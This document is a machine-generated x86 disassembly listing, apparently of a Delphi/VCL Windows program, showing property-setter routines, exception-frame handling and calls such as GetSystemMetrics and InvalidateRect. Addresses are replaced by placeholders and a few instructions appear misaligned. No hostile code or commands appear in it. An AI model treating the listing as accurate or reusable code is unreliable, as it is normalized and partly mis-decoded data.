jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_473ebc
retn
mov edx ecx
sub_473e84
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_416e44
sub_473f04
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_416e44
sub_473f58
or ecx 0xffffffff
xor edx edx
call sub_473fa8
retn
sub_473f78
mov eax [ eax + 0x18 ]
retn
sub_474220
jmp sub_403e54
sub_474342
jmp sub_403e54
sub_474349
mov eax [ ebp - 0x4 ]
call sub_4458bc
pop ecx
pop ecx
pop ebp
retn
sub_4744fe
jmp sub_403e54
sub_47459c
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_4745bc
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_474608
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_445ac0
sub_47461c
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_445ac0
sub_474630
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_445ac0
sub_474644
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_445ac0
sub_474658
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_474905
jmp sub_403e54
sub_47490c
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_474ab2
jmp sub_403e54
sub_474e9e
jmp sub_403e54
sub_474ebb
jmp sub_403e54
sub_474ecc
push ebx
mov ebx eax
mov eax ebx
call sub_4469c4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_47511c
jmp sub_403e54
sub_475123
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475146
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405ab4
retn
sub_47513f
jmp sub_403e54
sub_475146
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4751a8
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_475200
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_473f14
retn
sub_47594b
jmp sub_403e54
sub_475958
mov ecx edx
mov dl 0x1
call sub_475868
retn
sub_475964
mov ecx edx
xor edx edx
call sub_475868
retn
sub_475970
mov dl 0x4
call sub_47551c
retn
sub_475a4c
mov ecx edx
mov dl 0x3
call sub_4755b0
retn
sub_475a58
xor edx edx
call sub_47551c
retn
sub_475a80
mov dl 0x1
call sub_47551c
retn
sub_475b30
mov dl 0x2
call sub_47551c
retn
sub_475cac
test edx edx
je r-xdata
xor eax eax
retn
mov eax edx
call sub_475bac
retn
sub_475e86
jmp sub_403e54
sub_475e8d
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476054
jmp sub_403e54
sub_47605b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4761e2
jmp sub_403e54
sub_476284
push edx
xor ecx ecx
xor edx edx
call sub_476290
retn
sub_47632c
cmp [ eax + 0x24 ] 0x0
jne r-xdata
retn
call sub_4036c0
sub_4764f4
jmp sub_403e54
sub_4764fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476640
mov eax [ eax + 0x4 ]
call sub_448484
retn
sub_47664c
mov eax edx
call sub_47632c
retn
sub_4766ca
jmp sub_403e54
sub_4766d1
pop ecx
pop ecx
pop ebp
retn
sub_4766d8
push ecx
push 0x0
push 0x2
xor ecx ecx
xchg edx ecx
call sub_4766f8
retn
sub_4766e8
push ecx
push 0x0
push 0x0
xor ecx ecx
xchg edx ecx
call sub_4766f8
retn
j_sub_403ba0#4
jmp sub_403ba0
sub_476894
jmp sub_403e54
sub_47689b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_47691c
mov [ edx + 0x25 ] 0x1
mov [ ecx ] 0x27
mov [ ecx + 0x24 ] edx
mov [ ecx + 0x10 ] 0xffffffff
mov [ ecx + 0x18 ] 0xffffffff
mov [ ecx + 0x1c ] 0xffffffff
retn
sub_476aa5
jmp sub_403e54
sub_476aac
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476ae8
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_476b00
sub_476b34
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_476b00
sub_476bc4
jmp sub_403e54
sub_476d7d
jmp sub_403e54
sub_476d84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476ed4
xor edx edx
mov [ eax + 0xc ] edx
retn
sub_4773fd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_476b34
retn
sub_47740c
jmp sub_403e54
j_sub_4773fd
jmp sub_4773fd
sub_477636
jmp sub_403e54
j_sub_403ba0#3
jmp sub_403ba0
sub_477742
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477780
push ebx
mov ebx eax
mov eax ebx
call sub_447ae8
cmp [ ebx + 0x209 ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_445ac0
sub_4777ec
push edx
xor ecx ecx
xor edx edx
call sub_4777f8
retn
sub_4779e4
push ebx
mov ebx eax
mov eax ebx
call sub_448484
call sub_4294b8
pop ebx
retn
sub_477a24
push ebx
mov ebx eax
mov eax ebx
call sub_443e3c
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4779f8
sub_477a98
push esi
mov esi eax
xor edx edx
mov eax [ esi + 0x330 ]
call sub_4374f0
mov eax [ esi + 0x330 ]
mov edx [ eax + 0xc ]
mov eax esi
mov si 0xffaf
call sub_4038bc
pop esi
retn
sub_477d89
jmp sub_403e54
sub_478131
jmp sub_403e54
sub_4781d6
jmp sub_403e54
sub_4785e8
jmp sub_403e54
sub_4785ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4785f8
push ebx
mov ebx eax
mov eax [ ebx + 0x21c ]
call sub_44f260
test eax eax
jle r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x21c ]
pop ebx
retn
sub_478838
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
sub_478858
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
sub_4788f1
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x2f2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2f4 ]
call [ ebx + 0x2f0 ]
sub_478914
push ebx
cmp [ eax + 0x2ea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
sub_478934
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
sub_478980
push ebx
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_478aa4
jmp sub_403e54
sub_478aab
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478af0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4765b4
retn
sub_478e24
jmp sub_403e54
sub_478e2b
pop ebx
mov esp ebp
pop ebp
retn
sub_478f70
mov [ eax + 0x210 ] 0x1
retn
sub_47917c
push esi
mov esi eax
test [ esi + 0x275 ] 0x1
setne al
xor al 0x1
push eax
mov eax esi
call sub_479570
pop esi
retn
sub_479198
push ebx
mov ebx eax
mov eax ebx
call sub_4793cc
mov eax ebx
call sub_446e04
pop ebx
retn
sub_4791ac
push ebx
mov ebx eax
mov eax ebx
call sub_446e24
mov eax ebx
call sub_4793cc
pop ebx
retn
sub_479398
jmp sub_403e54
sub_4793a8
mov eax [ eax + 0x278 ]
mov eax [ eax + 0x8 ]
retn
sub_479735
jmp sub_403e54
sub_4797df
jmp sub_403e54
sub_4797e6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479902
jmp sub_403e54
sub_479909
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479a85
jmp sub_403e54
sub_479bd2
jmp sub_403e54
sub_479bd9
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_479c70
push ebx
mov ebx edx
mov eax ebx
xor ecx ecx
mov edx 0x3c
call sub_402fc4
mov [ ebx ] 0x3c
pop ebx
retn
sub_479e3b
jmp sub_403e54
sub_479e42
pop ebx
mov esp ebp
pop ebp
retn
sub_479ef0
add esp 0xffffffc4
mov edx esp
call sub_479c8c
mov eax [ esp + 0xc ]
mov ecx 0x14
cdq
idiv ecx
add esp 0x3c
retn
sub_47a0e3
jmp sub_403e54
sub_47a0ea
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47a216
jmp sub_403e54
sub_47a21d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47a260
push ebx
mov ebx edx
mov eax ebx
xor ecx ecx
mov edx 0x9c
call sub_402fc4
mov [ ebx ] 0x9c
pop ebx
retn
sub_47a314
add esp 0xffffff64
mov edx esp
call sub_47a27c
mov ax [ esp + 0x18 ]
dec eax
add esp 0x9c
retn
sub_47a36c
add esp 0xffffff64
mov edx esp
call sub_47a27c
mov al [ esp + 0x8 ]
add esp 0x9c
retn
sub_47a3e8
add esp 0xffffff64
mov edx esp
call sub_47a27c
mov eax [ esp + 0xc ]
mov ecx 0x14
cdq
idiv ecx
add esp 0x9c
retn
sub_47a444
add esp 0xffffff64
mov edx esp
call sub_47a27c
mov eax [ esp + 0x14 ]
mov ecx 0x14
cdq
idiv ecx
add esp 0x9c
retn
sub_47a4a0
add esp 0xffffff64
mov edx esp
call sub_47a27c
mov eax [ esp + 0x10 ]
mov ecx 0x14
cdq
idiv ecx
add esp 0x9c
retn
sub_47a614
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
sub_47a628
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_47a759
clc
dec [ ebx - 0x31d7f2d ]
mov eax esi
call sub_417574
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_47a7e3
jmp sub_403e54
sub_47a7ea
mov esp ebp
pop ebp
retn
sub_47aa90
jmp sub_403e54
sub_47aa97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ab60
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xdc ]
pop esi
retn
sub_47ac60
jmp sub_403e54
sub_47ac67
pop ebx
pop ecx
pop ebp
retn
sub_47ace5
jmp sub_403ba0
sub_47acea
mov esi 0x2
call sub_403f08
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_47adb9
jmp sub_403ba0
sub_47adbe
mov [ ebp - 0x4 ] 0x1
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ade7
mov eax [ ebp - 0x8 ]
call sub_409214
retn
sub_47ade0
jmp sub_403e54
sub_47ade7
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_47af2a
jmp sub_403e54
sub_47af31
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47af4e
lea eax [ ebp - 0x20 ]
call sub_40442c
retn
sub_47af47
jmp sub_403e54
sub_47af4e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b03c
jmp sub_403e54
sub_47b043
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b060
lea eax [ ebp - 0x20 ]
call sub_40442c
retn
sub_47b059
jmp sub_403e54
sub_47b060
pop ebx
mov esp ebp
pop ebp
retn
sub_47b111
jmp sub_403ba0
sub_47b161
jmp sub_403e54
sub_47b168
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403ba0#2
jmp sub_403ba0
sub_47b256
jmp sub_403e54
sub_47b25d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b3dc
push ebx
mov ebx eax
mov eax ebx
call sub_431da4
xor edx edx
mov eax ebx
call sub_431bd0
pop ebx
retn
sub_47b592
jmp sub_403e54
sub_47b660
jmp sub_403e54
sub_47b667
mov eax [ ebp - 0x4 ]
call sub_432100
pop ecx
pop ecx
pop ebp
retn
sub_47b674
call sub_432adc
retn
sub_47b67c
mov edx [ eax + 0x68 ]
mov eax [ eax + 0x238 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b6e4
mov edx [ eax + 0x68 ]
mov eax [ eax + 0x238 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47b870
jmp sub_403e54
sub_47b877
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b91c
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
call sub_445ac0
sub_47b9bc
mov eax [ eax + 0x248 ]
mov al [ eax + 0x14 ]
retn
sub_47b9c8
mov eax [ eax + 0x248 ]
mov [ eax + 0x14 ] dl
retn
sub_47ba00
push esi
mov esi eax
mov eax [ esi + 0x248 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47bbff
jmp sub_403e54
sub_47bc06
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bcc2
jmp sub_403e54
sub_47be3c
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_47be5c
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_47c17c
push esi
mov [ eax + 0x218 ] dx
mov [ eax + 0x21a ] cx
mov si 0xffb3
call sub_4038bc
pop esi
retn
sub_47c238
cmp [ eax + 0x228 ] 0x1
jne r-xdata
mov dl 0x1
call sub_47c800
retn
xor edx edx
call sub_47c800
retn
sub_47c28c
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_47c4ba
jmp sub_403e54
sub_47c4c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c77c
jmp sub_403e54
sub_47c783
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47cb72
jmp sub_403e54
sub_47cc9b
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405ab4
retn
sub_47ccaa
jmp sub_403e54
j_sub_47cc9b
jmp sub_47cc9b
sub_47ccb1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47cd0c
mov al [ eax + 0xd ]
xor al 0x1
retn
sub_47cdac
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
call sub_47cb88
sub_47cdbc
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_416e44
sub_47cdcc
cmp edx [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] edx
xor edx edx
call sub_416e44
sub_47ced0
mov eax [ eax + 0x18 ]
retn
sub_47cfe3
jmp sub_403e54
sub_47d038
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_404480
pop esi
pop ebx
retn
sub_47d146
jmp sub_403e54
sub_47d14d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47d36c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_47dbf8
retn
sub_47d444
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_47dd00
retn
sub_47d450
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_4161a0
pop esi
pop ebx
retn
sub_47d464
mov eax [ eax + 0x34 ]
call sub_4162ec
retn
sub_47d534
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_47d52c
cmp ebx [ eax + 0x28c ]
je r-xdata
mov eax ebx
call sub_4036c0
sub_47d5fc
push ebx
mov ebx eax
mov eax ebx
call sub_47da4c
push eax
mov eax ebx
call sub_47d558
pop edx
call sub_42928c
pop ebx
retn
sub_47da38
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_47da4c
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x244 ] 0x0
je r-xdata
xchg edx eax
call sub_47dc84
retn
mov eax [ eax + 0x18 ]
retn
sub_47da98
mov eax [ eax + 0x8 ]
call sub_47d450
retn
sub_47db78
or ecx 0xffffffff
xor edx edx
call sub_47db84
retn
sub_47dcac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47dbf8
mov ecx 0x1
mov edx esi
call sub_429378
pop esi
pop ebx
retn
sub_47dcc8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_47dbf8
call sub_4290bc
sub_47dce8
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_47dd00
sub_47de81
jmp sub_403e54
sub_47dec4
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_47dd00
sub_47e1dc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_402764
retn
sub_47e1e8
jmp sub_403e54
j_sub_47e1dc
jmp sub_47e1dc
sub_47e1ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e211
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404450
retn
sub_47e20a
jmp sub_403e54
sub_47e211
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e49f
jmp sub_403e54
sub_47e4a6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e4c8
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_404450
retn
sub_47e4c1
jmp sub_403e54
sub_47e4c8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e4d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47dc04
call sub_47d534
pop esi
pop ebx
retn
sub_47e4e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_47e580
cmp dl [ eax + 0x8 ]
je r-xdata
retn
mov [ eax + 0x8 ] dl
mov eax [ eax + 0x4 ]
call sub_445ac0
sub_47e594
cmp dl [ eax + 0x9 ]
je r-xdata
retn
mov [ eax + 0x9 ] dl
mov eax [ eax + 0x4 ]
call sub_445ac0
sub_47e5a8
cmp dl [ eax + 0xa ]
je r-xdata
retn
mov [ eax + 0xa ] dl
mov eax [ eax + 0x4 ]
call sub_445ac0
sub_47eac4
jmp sub_403e54
sub_47ec1a
jmp sub_403e54
sub_47ef71
jmp sub_403e54
sub_47ef78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ef9b
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405ab4
retn
j_sub_403e54#9
jmp sub_403e54
sub_47ef9b
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403ba0#5
jmp sub_403ba0
sub_47f07e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403ba0
jmp sub_403ba0
sub_47f17e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f444
cmp dl [ eax + 0x214 ]
je r-xdata
retn
mov [ eax + 0x214 ] dl
call sub_445ac0
sub_47f458
cmp dl [ eax + 0x22a ]
je r-xdata
retn
mov [ eax + 0x22a ] dl
call sub_445ac0
sub_47f4b4
cmp dl [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] dl
call sub_445ac0
sub_47f4c8
cmp dl [ eax + 0x22b ]
je r-xdata
retn
mov [ eax + 0x22b ] dl
call sub_445ac0
sub_47f4dc
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax ebx
call sub_448484
pop edx
call sub_429234
pop ebx
retn
j_sub_403e54#8
jmp sub_403e54
sub_47f7ae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f7cc
cmp [ eax + 0x215 ] 0x3
sete al
retn
sub_47f7d8
cmp [ eax + 0x264 ] 0x0
setne al
retn
sub_47f824
cmp dl [ eax + 0x238 ]
je r-xdata
retn
mov [ eax + 0x238 ] dl
call sub_445ac0
sub_47fa40
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_47db10
retn
sub_47fbbb
jmp sub_403e54
sub_47fbc2
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47fbcc
push ebx
mov ebx eax
mov eax ebx
call sub_448484
call sub_4293a4
pop ebx
retn
j_sub_403e54#7
jmp sub_403e54
j_sub_403e54#6
jmp sub_403e54
j_sub_403e54#5
jmp sub_403e54
sub_48090d
jmp sub_403e54
sub_480914
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480990
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_4809e0
push ebx
cmp [ eax + 0x362 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x364 ]
call [ ebx + 0x360 ]
sub_480a59
jmp sub_403e54
sub_480a60
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403e54#4
jmp sub_403e54
sub_480bc4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_481180
mov eax [ eax + 0x23c ]
call sub_47ceb8
retn
sub_48120c
push ebx
cmp [ eax + 0x34a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x34c ]
call [ ebx + 0x348 ]
sub_48183f
jmp sub_403e54
sub_48185c
jmp sub_403e54
sub_481863
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4819b9
jmp sub_403e54
sub_4819c0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4819d0
mov [ eax + 0x28a ] 0x1
retn
sub_481e33
jmp sub_403e54
sub_481e3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403e54#3
jmp sub_403e54
sub_481f8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481f94
push ebx
cmp [ eax + 0x35a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x35c ]
call [ ebx + 0x358 ]
sub_4821ed
jmp sub_403e54
sub_4821f4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4821fc
mov eax [ eax + 0x22c ]
call sub_47dbd4
retn
sub_482291
jmp sub_403e54
sub_482298
pop ecx
pop ebp
retn
sub_48229c
mov eax [ r-xdata ]
retn
sub_482449
jmp sub_403e54
sub_482450
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482604
retn
sub_482709
jmp sub_403e54
sub_482710
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4827fc
mov al [ eax + 0x244 ]
retn
sub_482804
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_482820
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_48283c
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_482858
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4828f1
jmp sub_403ba0
sub_482b74
jmp sub_403e54
sub_482b7b
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_403e54#2
jmp sub_403e54
sub_482cb7
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_482f30
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x10
call sub_473c40
sub_482f50
cmp dl [ eax + 0x246 ]
je r-xdata
retn
mov [ eax + 0x246 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x8
call sub_473c40
sub_482f70
cmp dl [ eax + 0x247 ]
je r-xdata
retn
mov [ eax + 0x247 ] dl
mov ecx edx
mov edx 0x4
call sub_473c40
sub_4831de
add [ eax ] al
call sub_448484
retn
sub_483406
jmp sub_403e54
sub_48340d
push 0x6
call GetSystemMetrics
mov edx eax
shl edx 0x3
add edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_441544
pop ebx
mov esp ebp
pop ebp
retn
sub_48342c
cmp [ eax + 0x269 ] 0x0
jne r-xdata
mov [ eax + 0x252 ] 0x0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_483506
add [ eax ] al
push ebx
cmp [ eax + 0x282 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
sub_483570
push ebx
mov ebx eax
mov eax ebx
call sub_447a04
push 0xffffffff
push 0x0
mov eax ebx
call sub_448484
push eax
call InvalidateRect
pop ebx
retn
j_sub_403e54
jmp sub_403e54
sub_4837cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4837d4
push ebx
mov ebx eax
mov eax ebx
call sub_448484
call sub_4297a8
pop ebx
retn
sub_4837e8
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_4838d4
jmp sub_403e54
sub_48391c
cmp dl [ eax + 0x250 ]
je r-xdata
retn
mov [ eax + 0x250 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
sete cl
mov edx 0x20
call sub_473c40
sub_483994
cmp dl [ eax + 0x253 ]
je r-xdata
retn
mov [ eax + 0x253 ] dl
call sub_445ac0
sub_4839a8
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_445ac0
sub_4839bc
cmp dl [ eax + 0x256 ]
je r-xdata
retn
mov [ eax + 0x256 ] dl
call sub_445ac0
sub_4839d0
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx edx
mov edx 0x10
